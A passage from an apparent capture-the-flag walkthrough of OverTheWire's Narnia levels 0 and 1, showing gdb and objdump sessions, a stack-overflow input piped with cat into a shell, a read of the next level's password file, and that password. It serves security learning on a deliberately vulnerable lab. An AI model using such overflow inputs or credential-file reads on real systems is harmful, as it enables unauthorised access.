+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia0</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">gdb</span> <span class="n">narnia0</span>
+<span class="n">GNU</span> <span class="nf">gdb </span><span class="p">(</span><span class="n">Debian</span> <span class="m">7.12-6</span><span class="p">)</span> <span class="m">7.12.0.20161007</span><span class="o">-</span><span class="n">git</span>
+<span class="nf">Copyright </span><span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="m">2016</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc.</span>
+<span class="n">License</span> <span class="n">GPLv3</span><span class="o">+:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="m">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="o">://</span><span class="n">gnu.org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl.html</span><span class="o">&gt;</span>
+<span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="o">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it.</span>
+<span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law.</span>  <span class="n">Type</span> <span class="s">&#34;show copying&#34;</span>
+<span class="n">and</span> <span class="s">&#34;show warranty&#34;</span> <span class="n">for</span> <span class="n">details.</span>
+<span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">&#34;x86_64-linux-gnu&#34;</span><span class="n">.
+</span><span class="n">Type</span> <span class="s">&#34;show configuration&#34;</span> <span class="n">for</span> <span class="n">configuration</span> <span class="n">details.</span>
+<span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="o">:</span>
+<span class="o">&lt;</span><span class="n">http</span><span class="o">://</span><span class="n">www.gnu.org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;</span><span class="n">.
+</span><span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="n">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="o">:</span>
+<span class="o">&lt;</span><span class="n">http</span><span class="o">://</span><span class="n">www.gnu.org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">documentation</span><span class="o">/&gt;</span><span class="n">.
+</span><span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="n">type</span> <span class="s">&#34;help&#34;</span><span class="n">.
+</span><span class="n">Type</span> <span class="s">&#34;apropos word&#34;</span> <span class="n">to</span> <span class="n">search</span> <span class="n">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s">&#34;word&#34;</span><span class="kc">...</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="nf">narnia0...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="nf">...done.
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="nf">intel
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">main</span>
+<span class="n">...long</span> <span class="n">output</span> <span class="n">from</span> <span class="n">the</span> <span class="n">disassembly</span><span class="p">,</span> <span class="n">similar</span> <span class="n">to</span> <span class="n">the</span> <span class="nf">objdump
+</span><span class="nf"></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="n">main</span>
+<span class="n">Breakpoint</span> <span class="m">1</span> <span class="n">at</span> <span class="mh">0x804855f</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia0</span>
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x0804855f</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x8048690</span>
+<span class="mh">0x8048690</span><span class="o">:</span> <span class="s">&#34;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!&#34;</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80486d9</span>
+<span class="mh">0x80486d9</span><span class="o">:</span> <span class="s">&#34;%24s&#34;</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x80486f4</span>
+<span class="mh">0x80486f4</span><span class="o">:</span> <span class="s">&#34;/bin/sh&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>What&rsquo;s interesting here is that the format string is expecting 24 characters, despite the buffer being only 20 bytes. Another interesting aspect, is that it is clear the string being passed into <code>system</code> is <code>/bin/sh</code> (aka what&rsquo;s located at <code>0x80486f4</code>). So we know that if we can get <code>0xdeadbeef</code> into <code>val</code>, we&rsquo;ll execute <code>/bin/sh</code> and get to the next level.</p>
+<p>Running through GDB allows for some deeper inspection as to what&rsquo;s going on. After setting a breakpoint in main, and another right before loading the buffer&rsquo;s address into the register <code>$eax</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia0</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x0804855f</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">5i</span> <span class="o">$</span><span class="n">pc</span>
+<span class="o">=&gt;</span> <span class="mh">0x804855f</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+4</span><span class="o">&gt;:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x18</span>
+   <span class="mh">0x8048562</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+7</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">-0</span><span class="n">x8]</span><span class="p">,</span><span class="mh">0x41414141</span>
+   <span class="mh">0x8048569</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+14</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="mh">0x8048690</span>
+   <span class="mh">0x804856e</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+19</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x80483f0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x8048573</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+24</span><span class="o">&gt;:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;</span><span class="err">s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+
+<span class="n">Breakpoint</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0x08048583</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">5i</span> <span class="o">$</span><span class="n">pc</span>
+<span class="o">=&gt;</span> <span class="mh">0x8048583</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+40</span><span class="o">&gt;:</span> <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x1c]</span>
+   <span class="mh">0x8048586</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+43</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="n">eax</span>
+   <span class="mh">0x8048587</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+44</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="mh">0x80486d9</span>
+   <span class="mh">0x804858c</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+49</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x8048440</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x8048591</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+54</span><span class="o">&gt;:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Taking a peek at the stack, the buffer, and then stepping again:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">20</span><span class="n">xw</span> <span class="o">$</span><span class="n">ebp</span>
+<span class="mh">0xffffd6c8</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000001</span> <span class="mh">0xffffd764</span>
+<span class="mh">0xffffd6d8</span><span class="o">:</span> <span class="mh">0xffffd76c</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6e8</span><span class="o">:</span> <span class="mh">0xf7fc5000</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6f8</span><span class="o">:</span> <span class="mh">0x00000001</span> <span class="mh">0xf7fc5000</span> <span class="mh">0x00000000</span> <span class="mh">0xc794cc50</span>
+<span class="mh">0xffffd708</span><span class="o">:</span> <span class="mh">0xfd7de040</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">20</span><span class="n">xw</span> <span class="o">$</span><span class="n">ebp</span><span class="m">-0</span><span class="n">x1c</span>
+<span class="mh">0xffffd6ac</span><span class="o">:</span> <span class="mh">0x08048631</span> <span class="mh">0xf7fc53dc</span> <span class="mh">0x0804824c</span> <span class="mh">0x08048619</span>
+<span class="mh">0xffffd6bc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x41414141</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6cc</span><span class="o">:</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000001</span> <span class="mh">0xffffd764</span> <span class="mh">0xffffd76c</span>
+<span class="mh">0xffffd6dc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0xf7fc5000</span>
+<span class="mh">0xffffd6ec</span><span class="o">:</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000001</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="mh">0x08048586</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">5i</span> <span class="o">$</span><span class="n">pc</span>
+<span class="o">=&gt;</span> <span class="mh">0x8048586</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+43</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="n">eax</span>
+   <span class="mh">0x8048587</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+44</span><span class="o">&gt;:</span> <span class="n">push</span>   <span class="mh">0x80486d9</span>
+   <span class="mh">0x804858c</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+49</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x8048440</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x8048591</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+54</span><span class="o">&gt;:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+   <span class="mh">0x8048594</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+57</span><span class="o">&gt;:</span> <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="n">[ebp</span><span class="m">-0</span><span class="n">x1c]</span>
+
+<span class="n">Stepping</span> <span class="n">a</span> <span class="n">bit</span> <span class="n">further</span> <span class="n">and</span> <span class="n">making</span> <span class="n">sure</span> <span class="o">$</span><span class="n">eax</span> <span class="n">gets</span> <span class="n">the</span> <span class="n">address</span> <span class="n">we</span> <span class="n">expect</span><span class="o">:</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">20</span><span class="n">xw</span> <span class="o">$</span><span class="n">eax</span>
+<span class="mh">0xffffd6ac</span><span class="o">:</span> <span class="mh">0x08048631</span> <span class="mh">0xf7fc53dc</span> <span class="mh">0x0804824c</span> <span class="mh">0x08048619</span>
+<span class="mh">0xffffd6bc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x41414141</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6cc</span><span class="o">:</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000001</span> <span class="mh">0xffffd764</span> <span class="mh">0xffffd76c</span>
+<span class="mh">0xffffd6dc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0xf7fc5000</span>
+<span class="mh">0xffffd6ec</span><span class="o">:</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000001</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">20</span><span class="n">xw</span> <span class="mh">0xffffd6ac</span>
+<span class="mh">0xffffd6ac</span><span class="o">:</span> <span class="mh">0x08048631</span> <span class="mh">0xf7fc53dc</span> <span class="mh">0x0804824c</span> <span class="mh">0x08048619</span>
+<span class="mh">0xffffd6bc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x41414141</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6cc</span><span class="o">:</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000001</span> <span class="mh">0xffffd764</span> <span class="mh">0xffffd76c</span>
+<span class="mh">0xffffd6dc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0xf7fc5000</span>
+<span class="mh">0xffffd6ec</span><span class="o">:</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000001</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="mh">0x08048587</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="mh">0x0804858c</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>A few more instructions before we are prompted and provide some inputs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="n">Here</span> <span class="n">is</span> <span class="n">your</span> <span class="n">chance</span><span class="o">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBBBBB</span>
+<span class="mh">0x08048591</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And now looking at the contents of our stack, we can see that we overwrote <code>var</code> and filled our buffer with <code>B</code>s:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">20</span><span class="n">xw</span> <span class="mh">0xffffd6ac</span>
+<span class="mh">0xffffd6ac</span><span class="o">:</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span>
+<span class="mh">0xffffd6bc</span><span class="o">:</span> <span class="mh">0x42424242</span> <span class="mh">0x42424242</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6cc</span><span class="o">:</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000001</span> <span class="mh">0xffffd764</span> <span class="mh">0xffffd76c</span>
+<span class="mh">0xffffd6dc</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0xf7fc5000</span>
+<span class="mh">0xffffd6ec</span><span class="o">:</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000001</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>All that&rsquo;s left now is to provide some inputs and get to the next level, one thing to keep in mind is that given the <a href="https://en.wikipedia.org/wiki/Endianness" target="_blank" rel="noopener noreffer">endianness</a>, the bytes have to be reversed so <code>0xdeadbeef</code> becomes <code>0xefbeadde</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia0</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &#34;A&#34;*20 + &#34;\xef\xbe\xad\xde&#34;&#39;</span> <span class="o">|</span> <span class="n">./narnia0</span>
+<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;</span><span class="err">s value from 0x41414141 -&gt; 0xdeadbeef!</span>
+<span class="n">Here</span> <span class="n">is</span> <span class="n">your</span> <span class="n">chance</span><span class="o">:</span> <span class="n">buf</span><span class="o">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAﾭ</span><span class="o">?</span>
+<span class="n">val</span><span class="o">:</span> <span class="mh">0xdeadbeef</span>
+<span class="n">narnia0</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Well, it seemed to work but the shell closed right away, which makes it really hard to get the password to the next level. There&rsquo;s a trick to keeping the shell open: leveaging <a href="https://en.wikipedia.org/wiki/Cat_%28Unix%29" target="_blank" rel="noopener noreffer">cat</a> to hold the input open after our <code>system</code> call has executed prevents the shell from closing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia0@narnia:/narnia$ <span class="o">(</span>python -c <span class="s1">&#39;print &#34;A&#34;*20 + &#34;\xef\xbe\xad\xde&#34;&#39;</span><span class="p">;</span>cat<span class="o">)</span> <span class="p">|</span> ./narnia0
+Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+efeidiedae
+</code></pre></td></tr></table>
+</div>
+</div><p>Not too bad for a first challenge and gave me a chance to explore some basic concepts in assembly and what to start to look for to understand how to exploit it.</p>
+<h2 id="narnia1">narnia1</h2>
+<p>How to log into Narnia:</p>
+<blockquote>
+<p>ssh -p 2226 <a href="mailto:narnia1@narnia.labs.overthewire.org">narnia1@narnia.labs.overthewire.org</a></p>
+</blockquote>
+<p>Password: <code>efeidiedae</code></p>
+<p>Where to find all of the challenges:</p>
+<blockquote>
+<p>cd /narnia/</p>
+</blockquote>
+<p>Just like last time, try running the program and see what it does:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">    narnia1@narnia:/narnia$ ./narnia1
+    Give me something to execute at the env-variable EGG
+    narnia1@narnia:/narnia$ <span class="nv">EGG</span><span class="o">=</span>ls ./narnia1
+    Trying to execute EGG!
+    Segmentation fault
+</code></pre></td></tr></table>
+</div>
+</div><p>Odd. Let&rsquo;s take a look at <a href="https://www.man7.org/linux/man-pages/man1/ltrace.1.html" target="_blank" rel="noopener noreffer">ltrace</a> to see what library calls the program might be making.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/narnia$ <span class="nv">EGG</span><span class="o">=</span>ls ltrace ./narnia1
+__libc_start_main<span class="o">(</span>0x804846b, 1, 0xffffd784, 0x80484c0 &lt;unfinished ...&gt;
+getenv<span class="o">(</span><span class="s2">&#34;EGG&#34;</span><span class="o">)</span>                                                                       <span class="o">=</span> <span class="s2">&#34;ls&#34;</span>
+puts<span class="o">(</span><span class="s2">&#34;Trying to execute EGG!&#34;</span>Trying to execute EGG!
+<span class="o">)</span>                                                      <span class="o">=</span> <span class="m">23</span>
+getenv<span class="o">(</span><span class="s2">&#34;EGG&#34;</span><span class="o">)</span>                                                                       <span class="o">=</span> <span class="s2">&#34;ls&#34;</span>
+--- SIGSEGV <span class="o">(</span>Segmentation fault<span class="o">)</span> ---
++++ killed by SIGSEGV +++
+</code></pre></td></tr></table>
+</div>
+</div><p>Nothing too obvious here, time to use <code>objdump</code>. Doesn&rsquo;t appear that it calls any internal functions and just sticks with system functions that get executed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">0804846</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">804846</span><span class="n">b</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="o">%ebp
+</span><span class="o"> 804846c: 89 e5                mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span><span class="o"> 804846e: 83 ec 04             sub    $0x4,%</span><span class="n">esp</span>
+ <span class="m">8048471</span><span class="o">:</span> <span class="m">68</span> <span class="m">40</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x8048540</span>
+ <span class="m">8048476</span><span class="o">:</span> <span class="n">e8</span> <span class="n">a5</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048320</span> <span class="o">&lt;</span><span class="n">getenv</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804847</span><span class="n">b</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="o">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 804847e: 85 c0                test   %</span><span class="n">eax</span><span class="p">,</span><span class="o">%eax
+</span><span class="o"> 8048480: 75 14                jne    8048496 &lt;main+0x2b&gt;
+</span><span class="o"> 8048482: 68 44 85 04 08       push   $0x8048544
+</span><span class="o"> 8048487: e8 a4 fe ff ff       call   8048330 &lt;puts@plt&gt;
+</span><span class="o"> 804848c: 83 c4 04             add    $0x4,%</span><span class="n">esp</span>
+ <span class="m">804848</span><span class="n">f</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="m">01</span>                <span class="n">push</span>   <span class="o">$</span><span class="mh">0x1</span>
+ <span class="m">8048491</span><span class="o">:</span> <span class="n">e8</span> <span class="n">aa</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048340</span> <span class="o">&lt;</span><span class="n">exit</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048496</span><span class="o">:</span> <span class="m">68</span> <span class="m">79</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="o">$</span><span class="mh">0x8048579</span>
+ <span class="m">804849</span><span class="n">b</span><span class="o">:</span> <span class="n">e8</span> <span class="m">90</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048330</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
